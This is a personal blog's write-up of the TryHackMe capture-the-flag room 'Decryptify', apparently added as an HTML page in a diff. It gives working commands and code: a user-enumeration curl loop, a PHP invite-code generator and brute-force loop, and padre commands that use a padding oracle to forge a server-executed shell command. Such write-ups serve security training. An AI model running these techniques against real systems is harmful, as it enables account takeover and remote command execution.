@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Decryptify | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — JavaScript deobfuscation, invite code brute force, user enumeration, and padding oracle attack.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/decryptify.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/decryptify.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Decryptify">
+<meta property="og:description" content="TryHackMe CTF — JavaScript deobfuscation, invite code brute force, user enumeration, and padding oracle attack.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Decryptify">
+<meta name="twitter:description" content="TryHackMe CTF — JavaScript deobfuscation, invite code brute force, user enumeration, and padding oracle attack.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Decryptify</h1>
+    <div class="post-description">TryHackMe CTF &mdash; JavaScript deobfuscation, invite code brute force, user enumeration, and padding oracle attack.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Port 1337 on an Apache web app. Login portal with two tabs. Page source already has <code>/api.php</code> sitting in the comments, not even trying to hide. Let's go.</p>
+
+<hr>
+
+<h2>Initial Enumeration</h2>
+
+<p>Nmap showed two ports: SSH on 22, web app on 1337. The web app won.</p>
+
+<p>The login portal had two forms — username/invite code and email/invite code. Two attack surfaces before I'd done anything. Page source referenced <code>/api.php</code>, which had its own login. Gobuster flagged some timeouts on a few paths. Noted, filed away, moved on.</p>
+
+<hr>
+
+<h2>API Discovery and JavaScript Deobfuscation</h2>
+
+<p><code>/api.php</code> had obfuscated JavaScript arrays in the source. Deobfuscated them.</p>
+
+<p>API password: <code>H7gY2tJ9wQzD4rS1</code></p>
+
+<p>Worked immediately. The API docs were now open, and they handed over the invite code generation algorithm:</p>
+
+<pre><code>function calculate_seed_value($email, $constant_value) {
+    $email_length = strlen($email);
+    $email_hex = hexdec(substr($email, 0, 8));
+    $seed_value = hexdec($email_length + $constant_value + $email_hex);
+    return $seed_value;
+}
+$seed_value = calculate_seed_value($email, $constant_value);
+mt_srand($seed_value);
+$random = mt_rand();
+$invite_code = base64_encode($random);</code></pre>
+
+<p>Same obfuscated array in <code>/js/api.js</code> deobfuscated to the same password. Confirmed.</p>
+
+<p>Algorithm: clear. Missing piece: <code>constant_value</code>.</p>
+
+<hr>
+
+<h2>User Enumeration</h2>
+
+<p>While hunting for the constant I tested the login forms for behavioral differences. Submitting a fake email returned an explicit error. Submitting <code>admin@decryptify.local</code> with a bad code returned nothing — just silence. That difference is meaningful.</p>
+
+<p>The email form leaked whether an account existed. The username form didn't. I needed the actual domain. Looped through likely candidates:</p>
+
+<pre><code>for e in admin@decryptify.thm admin@rce.thm admin@fake.thm \
+  admin@localhost.thm admin@ubuntu.thm; do
+  echo "== $e =="
+  curl -s -X POST http://TARGET:1337 \
+    -d "invite_username=$e&amp;invite_code=test" | grep -oP '(?&lt;=&lt;p class="text-danger"&gt;).*(?=&lt;/p&gt;)'
+  echo
+done</code></pre>
+
+<p><code>admin@fake.thm</code> — no error. That's the one.</p>
+
+<hr>
+
+<h2>Invite Code Brute Force</h2>
+
+<p>Valid email confirmed. Still needed <code>constant_value</code> to generate a working invite code. The API docs gave me the algorithm, so I just implemented it:</p>
+
+<pre><code>&lt;?php
+$email = $argv[1];
+$constant_value = (int)$argv[2];
+
+$email_length = strlen($email);
+$email_hex = hexdec(substr($email, 0, 8));
+$seed_value = hexdec($email_length + $constant_value + $email_hex);
+
+mt_srand($seed_value);
+$random = mt_rand();
+$invite_code = base64_encode($random);
+
+echo "email: $email\n";
+echo "constant: $constant_value\n";
+echo "seed: $seed_value\n";
+echo "invite_code: $invite_code\n";
+?&gt;</code></pre>
+
+<p>Automated the brute force — generate a code per constant value, submit it, stop when the response changes:</p>
+
+<pre><code>for i in $(seq 1 200); do
+  code=$(php invitegen.php admin@fake.thm $i | awk -F': ' '/invite_code/ {print $2}')
+  resp=$(curl -s -X POST http://TARGET:1337 \
+    -d "invite_username=admin@fake.thm&amp;invite_code=$code")
+  err=$(echo "$resp" | grep -oP '(?&lt;=&lt;p class="text-danger"&gt;).*(?=&lt;/p&gt;)')
+  if [[ "$err" != "Invalid invite code for the username admin@fake.thm." ]]; then
+    echo "[+] Possible hit: constant=$i code=$code"
+    break
+  fi
+done</code></pre>
+
+<p>No hits. The first interpretation of the seed calculation was wrong. Wrote a second generator using string concatenation instead of integer addition. Different codes, different range. Ran it again. Still nothing. The constant wasn't in the 1–300 range either way. Time to stop guessing and actually enumerate.</p>
+
+<hr>
+
+<h2>Finding the Constant &mdash; /logs/</h2>
+
+<p>Reran Nmap properly this time, with <code>--script=http-enum</code>:</p>
+
+<pre><code>nmap -sC -sV --script=http-enum -p22,1337 TARGET</code></pre>
+
+<p><code>/logs/</code> surfaced. Visited it.</p>
+
+<p><code>constant_value = 99999</code>. Right there in the logs the whole time.</p>
+
+<p>That directory was discoverable from the start. Deeper HTTP enumeration upfront would have found it in the first ten minutes instead of after a solid hour of creative dead ends. I'll be annoyed about that for at least a week.</p>
+
+<p>Generated the correct invite code. Access code: <code>NDYxNTg5ODkx</code></p>
+
+<p>Admin panel. First flag retrieved.</p>
+
+<hr>
+
+<h2>Padding Oracle — Command Execution</h2>
+
+<p>The dashboard at <code>/dashboard.php</code> accepted a <code>date</code> parameter — a base64-encoded ciphertext the server decrypted server-side to figure out what shell command to run for the footer date display.</p>
+
+<p>Modifying the parameter produced a very specific error:</p>
+
+<pre><code>Padding error: error:0606506D:digital envelope routines:
+EVP_DecryptFinal_ex:wrong final block length</code></pre>
+
+<p>That error is the oracle. The server was leaking whether the padding on my ciphertext was valid. That's all <code>padre</code> needs.</p>
+
+<p>Step 1 — decrypt the original value to confirm the behavior:</p>
+
+<pre><code>./padre -u 'http://TARGET:1337/dashboard.php?date=$' \
+  -cookie 'PHPSESSID=bmsj2b5btlphctiundj21o4ggl' \
+  'ET7bSJfUSDJmUAl8O4smqP91XxJSk0qgj2FnpulyU3c='</code></pre>
+
+<p>Output: <code>date +%Y</code></p>
+
+<p>The original ciphertext decrypted to <code>date +%Y</code> — exactly how the app was printing the current year in the footer. The <code>date</code> parameter wasn't a date string. It was an encrypted shell command.</p>
+
+<p>Step 2 — encrypt a new command:</p>
+
+<pre><code>./padre -u 'http://TARGET:1337/dashboard.php?date=$' \
+  -cookie 'PHPSESSID=bmsj2b5btlphctiundj21o4ggl' \
+  -enc 'cat /home/ubuntu/flag.txt'</code></pre>
+
+<p>Output: <code>8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==</code></p>
+
+<p>Dropped that into the <code>date</code> parameter. Server decrypted it, executed <code>cat /home/ubuntu/flag.txt</code>, printed the result in the footer. Second flag. Done.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Obfuscated JS → API password → invite code algorithm
+→ User enumeration leak → valid email (admin@fake.thm)
+→ PHP seed brute-force → no hit → should have enumerated earlier
+→ /logs/ → constant_value = 99999 → valid invite code → admin login
+→ Padding oracle decrypt → server executes shell commands
+→ Padding oracle encrypt → arbitrary command injection → flag</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
